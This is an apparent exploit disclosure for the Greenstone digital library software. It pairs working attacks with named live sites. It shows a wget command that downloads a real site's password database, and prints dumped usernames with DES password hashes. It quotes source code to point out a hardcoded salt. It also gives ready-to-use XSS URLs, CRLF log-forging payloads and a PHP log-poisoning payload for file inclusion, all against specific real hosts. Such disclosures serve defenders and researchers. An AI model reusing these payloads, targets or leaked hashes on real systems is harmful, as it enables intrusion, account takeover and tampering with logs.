@@ -1,0 +1,311 @@
+source: http://www.securityfocus.com/bid/56662/info
+
+Greenstone is prone to the following security vulnerabilities:
+
+1. A file-disclosure vulnerability
+2. A cross-site scripting vulnerability
+3. A security weakness
+4. A security-bypass vulnerability
+
+Attackers can exploit these issues to view local files, bypass certain security restriction, steal cookie-based authentication, or execute arbitrary scripts in the context of the browser. 
+
+=================Let's Roll============================
+
+
+Password  file disclosure:
+
+http://greenstone.flib.sci.am/gsdl/etc/users.gdb
+http://greenstone.flib.sci.am/gsdl/etc/key.gdb
+http://greenstone.martinique.univ-ag.fr/gsdl/etc/users.db
+http://greenstone.martinique.univ-ag.fr/gsdl/etc/key.db
+
+Example:
+(P.S Password encryption: Des (Unix))
+===================== Reproduce =====================
+$ wget http://greenstone.flib.sci.am/gsdl/etc/users.gdb && cat users.gdb
+--2012-11-22 17:04:39--  http://greenstone.flib.sci.am/gsdl/etc/users.gdb
+Resolving greenstone.flib.sci.am (greenstone.flib.sci.am)... 93.187.162.197
+Connecting to greenstone.flib.sci.am (greenstone.flib.sci.am)|93.187.162.197|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 12926 (13K) [text/plain]
+Saving to: `users.gdb'
+
+100%[==========================================>] 12,926      31.8K/s   in 0.4s
+
+2012-11-22 17:04:40 (31.8 KB/s) - `users.gdb' saved [12926/12926]
+.......Some junk snip........
+...                                admin<comment>created at install time
+<enabled>true
+<groups>administrator,colbuilder,all-collections-editor
+<password>TpM5gyFpfCsLc
+<username>admindemo<comment>Dummy 'demo' user with password 'demo' for authen-e collection
+<enabled>true
+<groups>demo
+<password>Tpp90HTz/jz9w
+<username>demotatevik<comment>
+<enabled>true
+<groups>all-collections-editor
+<password>Tpyq8s1oUIioc
+<username>tatevik
+azgayin<comment>
+<enabled>true
+<groups>all-collections-editor
+<password>Tp53Vsj1qM4cE
+<username>azgayin
+demo<comment>Dummy 'demo' user with password 'demo' for authen-e collection
+<enabled>true
+<groups>demo
+<password>TpzWMQXVfKFvw
+<username>demo
+
+========================= END OF users.gbd============================
+
+
+Known salt issuse (because this application uses "setpasswd" utility via 
+hardcoded salt=>: Tp)
+(Especially on windows systems)
+
+
+
+================================BEGIN================================
+/**********************************************************************
+ *
+ * setpasswd.cpp -- 
+ * Copyright (C) 2000  The New Zealand Digital Library Project
+ *
+ * A component of the Greenstone digital library software
+ * from the New Zealand Digital Library Project at the
+ * University of Waikato, New Zealand.
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
+ *
+ *********************************************************************/
+
+// setpasswd is a windows application that can be used to encrypt a password
+// and write it (along with its corresponding username) to a gdbm database.
+
+// it handles writing to the gdbm database itself to avoid having to call
+// the txt2db console application (and therefore avoiding the console
+// window popping up when called from another windows application).
+
+// note that setpasswd does no checking to make sure that any of it's
+// input arguments are valid (or even reasonable) values.
+
+// this program should be compiled into a binary called setpw.exe (to be
+// short enough not to mess with 16 bit Windows platforms).
+
+// usage:
+// setpw -u username -p password -o output_gdbm_file
+
+#include "text_t.h"
+#include "crypt.h"
+#include "autoconf.h"
+#include "systems.h"
+#include "gdbmconst.h"
+#include "gdbm.h"
+
+#include <windows.h>
+
+text_t username;
+text_t password;
+text_t output_gdbm_file;
+
+bool parse_cmdline (LPSTR cmdline) {
+
+  bool in_quote = false;
+  text_t arg;
+  text_tarray args;
+  unsigned char *c = (unsigned char *)cmdline;
+  while (*c != '\0') {
+    if (*c == '"') {
+      if (!in_quote) {
+  in_quote = true;
+      } else {
+  in_quote = false;
+  if (!arg.empty()) args.push_back (arg);
+  arg.clear();
+      }
+    } else if (*c == ' ' && !in_quote) {
+      if (!arg.empty()) args.push_back (arg);
+      arg.clear();
+    } else {
+      arg.push_back (*c);
+    }
+    ++c;
+  }
+  if (!arg.empty()) args.push_back (arg);
+  
+  text_tarray::const_iterator here = args.begin();
+  text_tarray::const_iterator end = args.end();
+  while (here != end) {
+    if (*here == "-u" && (++here != end)) username = *here;
+    else if (*here == "-p" && (++here != end)) password = *here;
+    else if (*here == "-o" && (++here != end)) output_gdbm_file = *here;
+    if (here != end) ++here;
+  }
+  if (username.empty() || password.empty() || output_gdbm_file.empty()) {
+    MessageBox (NULL, "Usage:\n setpasswd -u username -p password -o output_gdbm_file", 
+    "setpasswd failed", MB_OK);
+    return false;
+  }
+  return true;
+}
+
+text_t crypt_text (const text_t &text) {
+  static const char *salt = "Tp";
+  text_t crypt_password;
+
+  if (text.empty()) return "";
+
+  // encrypt the password
+  char *text_cstr = text.getcstr();
+  if (text_cstr == NULL) return "";
+  crypt_password = crypt(text_cstr, salt);
+  delete []text_cstr;
+
+  return crypt_password;
+}
+
+bool add_to_db () {
+
+  int block_size = 0;
+  GDBM_FILE dbf;
+  char *dbname = output_gdbm_file.getcstr();
+
+  // open the database
+  int read_write = GDBM_WRCREAT;
+  dbf = gdbm_open (dbname, block_size, read_write, 00664, NULL, 1);
+  if (dbf == NULL) {
+    MessageBox (NULL, "gdbm_open failed\n", "setpasswd", MB_OK);
+    return false;
+  }
+
+  datum key_data;
+  key_data.dptr = username.getcstr();
+  if (key_data.dptr == NULL) {
+    MessageBox (NULL, "null key_data\n", "setpasswd", MB_OK);
+    return false;
+  }
+  key_data.dsize = strlen(key_data.dptr);
+
+  text_t value = "<comment>\n";
+  value += "<enabled>true\n";
+  value += "<groups>administrator,colbuilder\n";
+  value += "<password>" + password + "\n";
+  value += "<username>" + username + "\n";
+      
+  datum value_data;
+  value_data.dptr = value.getcstr();
+  if (value_data.dptr == NULL) {
+    MessageBox (NULL, "null value_data\n", "setpasswd", MB_OK);
+    return false;
+  }
+  value_data.dsize = strlen(value_data.dptr);
+      
+  // store the value
+  if (gdbm_store (dbf, key_data, value_data, GDBM_REPLACE) < 0) {
+    MessageBox (NULL, "gdbm_store failed\n", "setpasswd", MB_OK);
+    return false;
+  }
+  gdbm_close (dbf);
+
+  delete []key_data.dptr;
+  delete []value_data.dptr;
+  delete []dbname;
+  return true;
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+                     LPSTR lpCmdLine, int nCmdShow) {
+
+  // parse command line arguments
+  if (!parse_cmdline (lpCmdLine)) return 1;
+
+  // encrypt the password
+  password = crypt_text (password);
+
+  // append the password and username to database
+  add_to_db();
+  
+  return 0;
+}
+
+============================================================
+
+XSS:
+
+site.tld/gsdl/cgi-bin/library.cgi?a=status&p=collectioninfo&pr=7&c=<script>alert("OwnEd");</script>
+Demo: 
+http://greenstone.unam.na/gsdl/cgi-bin/library.cgi?a=status&p=collectioninfo&pr=7&c=%3Cscript%3Ealert%28%22OwnEd%22%29;%3C/script%3E
+
+http://greenstone.flib.sci.am/gsdl/cgi-bin/library.cgi?a=status&p=collectioninfo&pr=7&c=%3Cscript%3Ealert%28%22OwnEd%22%29;%3C/script%3E%20%3E%3E%20greenstone.flib.greenstone.flib.sci.am/gsdl/cgi-bin/library.cgi?a=status&p=collectioninfo&pr=7&c=%3Cscript%3Ealert%28%22OwnEd%22%29;%3C/script%3E
+
+http://greenstone.flib.sci.am/gsdl/cgi-bin/library.cgi?a=status&p=%22%3E%3Cscript%3Ealert%28%22Again%20Owned%22%29;%3C/script%3E&pr=7&c=AkaStep
+
+
+============================================================
+
+
+
+Log forging:
+
+http://greenstone.unam.na/gsdl/cgi-bin/library.cgi?e=4?e=%223"%0D%0A%0D%0AWarning: Accepted connection from unknown host to local port: 22 root logged in%29%0D%0A%0D%0A" cmd.exe
+
+
+http://greenstone.unam.na/gsdl/cgi-bin/library.cgi?e=4?e=%223%0D%0A%0D%0AError%20D:\Program%20Files\Greenstone\%20directory%20owned?%29%0D%0A%0D%0A
+
+
+Forged log:  http://greenstone.unam.na/gsdl/etc/error.txt              (CTRL+F and search for:  host to local port: 22)
+
+Example:
+
+===================EXAMPLE OF =FORGED LOG====================
+Error: the action "4?e="3"
+
+
+
+Warning: Accepted connection from unknown host to local port: 22 root logged in)          <==Fake entry for Panic system administrator))))))
+
+
+
+" cmd.exe" could not be found.
+
+================END OF FORGED LOG=============
+
+Log File Poisoning: (Usefull for LFI)
+www.bibliotecamuseodelamemoria.cl/gsdl/cgi-bin/library.cgi?e=4?e="%0d%0a<?php phpinfo();?>%0d%0a%00%00
+
+Poisoned Log can be found in the following places: 
+site/gsdl/etc/error.txt
+or 
+site/etc/error.txt              (<=On Windows systems in ex i found it here)
+
+
+
+
+Example of injected log:
+==================================
+
+http://greenstone.unam.na/gsdl/etc/error.txt
+
+
+Error: the action "4?e="
+
+<?php phpinfo();?>
+
+.." could not be found.
+==================================
+
+******************** The End *******************
